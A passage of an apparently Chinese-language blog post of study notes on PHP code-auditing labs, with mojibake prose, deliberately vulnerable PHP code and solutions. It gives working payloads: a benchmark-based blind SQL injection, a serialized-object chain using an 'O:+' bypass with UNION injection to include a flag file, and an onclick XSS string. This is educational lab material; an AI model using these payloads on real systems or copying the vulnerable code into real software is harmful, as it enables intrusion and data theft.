æ³•è·å¾—sshå¯†é’¥,ä½†æ˜¯å…¶ä»£ç ä¸­å‡ºç°äº†ç–å¿½,åœ¨å¯¹userçš„sessionåˆ¤åˆ«åæ²¡æœ‰ç«‹å³<code>exit()</code>.é‚£ä¹ˆå½“æˆ‘ä»¬ä»¥www-dataç›´æ¥æœ¬åœ°curlè¿™ä¸€ç½‘é¡µæ—¶,å°†å¯ä»¥å¾—åˆ°å¯†é’¥,è¿›è€Œææƒã€‚</p><h3 id="ç»ƒä¹ -9"><a href="#ç»ƒä¹ -9" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stophack</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_array($string))&#123;</span><br><span class="line">        <span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            $string[$key] = stophack($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $raw = $string;</span><br><span class="line">        $replace = <span class="keyword">array</span>(<span class="string">"\\"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"/"</span>,<span class="string">"*"</span>,<span class="string">"%5C"</span>,<span class="string">"%22"</span>,<span class="string">"%27"</span>,<span class="string">"%2A"</span>,<span class="string">"~"</span>,<span class="string">"insert"</span>,<span class="string">"update"</span>,<span class="string">"delete"</span>,<span class="string">"into"</span>,<span class="string">"load_file"</span>,<span class="string">"outfile"</span>,<span class="string">"sleep"</span>,);</span><br><span class="line">        $string = str_ireplace($replace, <span class="string">"HongRi"</span>, $string);</span><br><span class="line">        $string = strip_tags($string);</span><br><span class="line">        <span class="keyword">if</span>($raw!=$string)&#123;</span><br><span class="line">            error_log(<span class="string">"Hacking attempt."</span>);</span><br><span class="line">            header(<span class="string">'Location: /error/'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> trim($string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"è¿æ¥å¤±è´¥: "</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) &amp;&amp; $_GET[<span class="string">'id'</span>])&#123;</span><br><span class="line">    $id = stophack($_GET[<span class="string">'id'</span>]);</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM students WHERE id=$id"</span>;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        $row = $result-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;h1&gt;æŸ¥è¯¢ç»“æœä¸ºï¼š&lt;/h1&gt;&lt;pre&gt;'</span>.<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+</span></span><br><span class="line"><span class="string">        | id | name    | email              | score |</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+</span></span><br><span class="line"><span class="string">        |  <span class="subst">&#123;$row['id']&#125;</span> | <span class="subst">&#123;$row['name']&#125;</span>   | <span class="subst">&#123;$row['email']&#125;</span>   |   <span class="subst">&#123;$row['score']&#125;</span> |</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+&lt;/center&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">"ä½ æ‰€æŸ¥è¯¢çš„å¯¹è±¡idå€¼ä¸èƒ½ä¸ºç©ºï¼"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶,ç¨‹åºå¦‚æœæ£€æµ‹åˆ°éæ³•å­—ç¬¦æˆ–å•è¯ï¼Œéƒ½ä¼šå°†å…¶æ›¿æ¢æˆå­—ç¬¦ä¸² HongRi ï¼Œç„¶è€Œå¹¶æ²¡æœ‰ç«‹å³é€€å‡ºï¼Œè¿™æ ·æ”»å‡»è€…è¾“å…¥çš„æ”»å‡»è¯­å¥è¿˜æ˜¯ä¼šç»§ç»­è¢«å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚åªä¸è¿‡è¿™é‡Œå…³é”®è¯éƒ½è¢«æ›¿æ¢æˆäº†å­—ç¬¦ä¸² HongRi</p><p>ç®€å•çš„ä½¿ç”¨benchmarkæ›¿æ¢sleepå³å¯ç›²æ³¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 or if(ascii(mid((select flag from flag),1,1))&#x3D;115,benchmark(200000000,7^3^8),0)</span><br></pre></td></tr></table></figure><h2 id="Day11"><a href="#Day11" class="headerlink" title="Day11"></a>Day11</h2><h3 id="phpååºåˆ—åŒ–"><a href="#phpååºåˆ—åŒ–" class="headerlink" title="phpååºåˆ—åŒ–"></a>phpååºåˆ—åŒ–</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/12.png" class="lazyload" data-srcset="12.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>(ç¬¬11è¡Œæ­£åˆ™è¡¨è¾¾å¼åº”æ”¹ä¸ºï¼šâ€™/O:\d:/â€˜)</p><p>é¦–å…ˆç¡®è®¤äº†å­˜åœ¨ååºåˆ—åŒ–ã€‚ä¸”æ•°æ®æ˜¯cookieå¯æ§ã€‚é‚£ä¹ˆè€ƒè™‘ä¸‹ç»•è¿‡æ‰§è¡Œååºåˆ—åŒ–ã€‚</p><p>é‚£ä¹ˆçœ‹ä¸‹loaddataé‡Œçš„é™åˆ¶<br>å¼€å¤´ä¸èƒ½æ˜¯<code>O:</code>,å³ååºåˆ—åŒ–å†…å®¹ä¸ä¸ºå¯¹è±¡<br>åŒæ—¶éœ€è¦ä¸èƒ½åŒ¹é…å­—ç¬¦ä¸²ä¸º<code>O:ä»»æ„åè¿›åˆ¶:</code><br>å¦‚æœåªæ˜¯ç¬¬ä¸€éƒ¨åˆ†å½“ç„¶å¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ã€‚ä½†æ˜¯è¿™æ ·ç¬¬äºŒéƒ¨åˆ†è¿˜æ˜¯ä¼šåŒ¹é…åˆ°æ•°ç»„ä¸­çš„å¯¹è±¡æˆåˆ†ã€‚</p><p>è¿™é‡Œç”¨åˆ°çš„æ˜¯ä¸€ä¸ªæ¯”è¾ƒè€çš„ç»•è¿‡æ–¹æ³•äº†ã€‚å³ä½¿ç”¨<code>O:+</code>ç»•è¿‡ã€‚è€ŒåŸç†å¯ä»¥æ¶‰åŠåˆ°åº•å±‚æºç ã€‚å‡½æ•°é‡åˆ°<code>+</code>å·æ—¶ä¼šç»§ç»­å‘ä¸‹åˆ¤æ–­ï¼Œå› æ­¤å¯ä»¥æ­£å¸¸ååºåˆ—åŒ–ã€‚</p><p>æœ€åå°±èƒ½æˆåŠŸæ‰§è¡Œå†™æ–‡ä»¶webshelläº†ã€‚</p><h3 id="ç»ƒä¹ -10"><a href="#ç»ƒä¹ -10" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HITCON</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $method;</span><br><span class="line">    <span class="keyword">public</span> $args;</span><br><span class="line">    <span class="keyword">public</span> $conn;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__conn();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__conn</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db_host, $db_name, $db_user, $db_pass, $DEBUG;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;conn)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;conn = mysql_connect($db_host, $db_user, $db_pass);</span><br><span class="line">        mysql_select_db($db_name, <span class="keyword">$this</span>-&gt;conn);</span><br><span class="line">        <span class="keyword">if</span> ($DEBUG) &#123;</span><br><span class="line">            $sql = <span class="string">"DROP TABLE IF  EXISTS  users"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line">            $sql = <span class="string">"CREATE TABLE IF NOT EXISTS users (username VARCHAR(64),</span></span><br><span class="line"><span class="string">            password VARCHAR(64),role VARCHAR(256)) CHARACTER SET utf8"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line">            $sql = <span class="string">"INSERT INTO users VALUES ('orange', '$db_pass', 'admin'), ('phddaa', 'ddaa', 'user')"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        mysql_query(<span class="string">"SET names utf8"</span>);</span><br><span class="line">        mysql_query(<span class="string">"SET sql_mode = 'strict_all_tables'"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__query</span><span class="params">($sql, $back=true)</span> </span>&#123;</span><br><span class="line">        $result = @mysql_query($sql);</span><br><span class="line">        <span class="keyword">if</span> ($back) &#123;</span><br><span class="line">            <span class="keyword">return</span> @mysql_fetch_object($result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($username, $password) = func_get_args();</span><br><span class="line">        $sql = sprintf(<span class="string">"SELECT * FROM users WHERE username='%s' AND password='%s'"</span>, $username, md5($password));</span><br><span class="line">        $obj = <span class="keyword">$this</span>-&gt;__query($sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( $obj != <span class="keyword">false</span> ) &#123;</span><br><span class="line">            define(<span class="string">'IN_FLAG'</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loadData($obj-&gt;role);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;__die(<span class="string">"sorry!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">'O:'</span> &amp;&amp; !preg_match(<span class="string">'/O:\d:/'</span>, $data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> unserialize($data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__die</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__close();</span><br><span class="line">        header(<span class="string">"Content-Type: application/json"</span>);</span><br><span class="line">        <span class="keyword">die</span>( json_encode( <span class="keyword">array</span>(<span class="string">"msg"</span>=&gt; $msg) ) );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mysql_close(<span class="keyword">$this</span>-&gt;conn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">source</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__conn();</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"login"</span>, <span class="string">"source"</span>))) &#123;</span><br><span class="line">            @call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">"What do you do?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = strtolower(trim(mysql_escape_string($v)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'index.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="keyword">$this</span>-&gt;file;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"data"</span>])) &#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">"data"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> HITCON(<span class="string">"source"</span>, <span class="keyword">array</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $db_host = <span class="string">'localhost'</span>;</span><br><span class="line">    $db_name = <span class="string">'test'</span>;</span><br><span class="line">    $db_user = <span class="string">'root'</span>;</span><br><span class="line">    $db_pass = <span class="string">'123'</span>;</span><br><span class="line">$DEBUG = <span class="string">'xx'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">!defined(<span class="string">'IN_FLAG'</span>) &amp;&amp; <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag&#123;un3eri@liz3_i3_s0_fun&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆä»ç®€å•çš„çœ‹èµ·,é¦–å…ˆæ˜¯SoFunç±»ã€‚æ˜¾ç„¶ç»•è¿‡wakeupå³å¯includeå¯æ§æ•°æ®flag.phpã€‚ä½†æ˜¯éœ€è¦æ³¨æ„flag.phpé™åˆ¶äº†å¿…é¡»<code>defined(&#39;IN_FLAG&#39;)</code>ã€‚</p><p>æ³¨æ„åˆ°HITCONç±»åˆ™æœ‰ä¸€ä¸ªè·Ÿå‰é¢ä¾‹å­ä¸€æ ·çš„loaddataã€‚é‚£å°±å¯ä»¥ç”¨ç›¸åŒæ–¹æ³•ç»•è¿‡æ‰§è¡Œååºåˆ—åŒ–ã€‚</p><p>HITCONç±»loginæ–¹æ³•æ˜¾ç„¶å­˜åœ¨sqlæ³¨å…¥,ä¸”loaddataå°±æ˜¯åœ¨è¿™é‡Œè¢«è°ƒç”¨çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬éœ€è¦è®©loaddataä¼ å…¥çš„æ•°æ®ä¸ºSoFunç±»çš„æ–‡ä»¶åŒ…å«åºåˆ—åŒ–æ•°æ®ã€‚<br>è€Œè¿™ä¸€æ•°æ®æ¥è‡ª<code>$obj-&gt;role</code>.</p><p><code>$obj</code>æ˜¯sqlè¯­å¥çš„è¿”å›ç»“æœã€‚è€Œsqlè¡¨ç»“æ„ä¸­ç¬¬ä¸‰ä¸ªå­—æ®µroleæ­£æ˜¯æˆ‘ä»¬éœ€è¦çš„ã€‚é‚£ä¹ˆåªè¦åˆ©ç”¨è¿™ä¸ªsqlæ³¨å…¥è¿›è¡ŒunionæŸ¥è¯¢å°±è¾¾æˆ<code>$obj-&gt;role</code>å¯æ§ã€‚</p><p>ç”±äºææ„å‡½æ•°ä¸­å¯ä»¥æ§åˆ¶æˆ‘ä»¬è°ƒç”¨çš„æ–¹æ³•åŠå‚æ•°ã€‚æ‰€ä»¥ä»¥ä¸Šæ€è·¯å¯ä»¥æ‰§è¡Œã€‚</p><p>æœ€åæ³¨æ„çš„æ˜¯ã€‚HITCONç±»çš„wakeupä¼šå¯¹sqlè¯­å¥è¿›è¡Œè½¬ä¹‰ã€‚æ‰€ä»¥æˆ‘ä»¬ç”¨åŒæ ·çš„æ–¹æ³•ç»•è¿‡wakeupå³å¯</p><p><code>O:6:&quot;HITCON&quot;:3:{s:6:&quot;method&quot;;s:5:&quot;login&quot;;s:4:&quot;args&quot;;a:2:{s:8:&quot;username&quot;;s:81:&quot;1&#39; union select 1,2,&#39;a:1:{s:2:&quot;xx&quot;;O:%2b5:&quot;SoFun&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}}&#39;%23&quot;;s:8:&quot;password&quot;;s:3:&quot;234&quot;;}}</code></p><h2 id="Day12"><a href="#Day12" class="headerlink" title="Day12"></a>Day12</h2><h3 id="htmlentities-å¤„ç†ä¸å…¨"><a href="#htmlentities-å¤„ç†ä¸å…¨" class="headerlink" title="htmlentities()å¤„ç†ä¸å…¨"></a>htmlentities()å¤„ç†ä¸å…¨</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/13.png" class="lazyload" data-srcset="13.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è¿™é‡Œçš„ä»£ç å­˜åœ¨ä¸€ä¸ªxssæ”»å‡».<br>è¾“å‡ºç‚¹åœ¨ä¸€ä¸ªaæ ‡ç­¾ã€‚åŒæ—¶è¾“å‡ºæ—¶ç»è¿‡äº†ä¸€æ¬¡htmlentities.ä¸è¿‡è¿™ä¸ªå‡½æ•°<code>htmlentities()</code>å¹¶ä¸èƒ½è½¬æ¢æ‰€æœ‰çš„ç‰¹æ®Šå­—ç¬¦ï¼Œæ˜¯è½¬æ¢é™¤äº†ç©ºæ ¼ä¹‹å¤–çš„ç‰¹æ®Šå­—ç¬¦ï¼Œä¸”å•å¼•å·å’ŒåŒå¼•å·éœ€è¦å•ç‹¬æ§åˆ¶<br>æ­¤å¤„é»˜è®¤å€¼çš„è¯æ˜¯ä¸ä¼šè½¬ä¹‰å•å¼•å·çš„ã€‚<br>åŒæ—¶å‰é¢åœ¨å˜é‡è¦†ç›–æ—¶ä¼ å…¥çš„å˜é‡åªå¯¹<code>$value</code> è¿›è¡Œç±»å‹è½¬æ¢ï¼Œå¼ºåˆ¶å˜æˆintç±»å‹ã€‚ä½†æ˜¯è¿™éƒ¨åˆ†ä»£ç åªå¤„ç†äº† <code>$value</code> å˜é‡ï¼Œæ²¡é’ˆå¯¹ <code>$key</code> å˜é‡è¿›è¡Œå¤„ç†</p><p>æ‰€ä»¥payloadæ˜¯<br><code>/?a&#39;onclick%3dalert(1)%2f%2f=c</code><br>ç»•è¿‡intvalçš„åŒæ—¶æ‰§è¡Œäº†aæ ‡ç­¾çš„onclikäº‹ä»¶,è¾¾æˆxss.</p><h3 id="ç»ƒä¹ -11"><a href="#ç»ƒä¹ -11" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i"</span>, $_REQUEST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Attack detected!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i"</span>, $_REQUEST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Attack detected!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $str=stripslashes($str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$query=<span class="string">'SELECT * FROM ctf.users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo $query;</span></span><br><span class="line"></span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">while</span>($row = mysql_fetch_array($result))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span> . $row[<span class="string">'name'</span>] . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 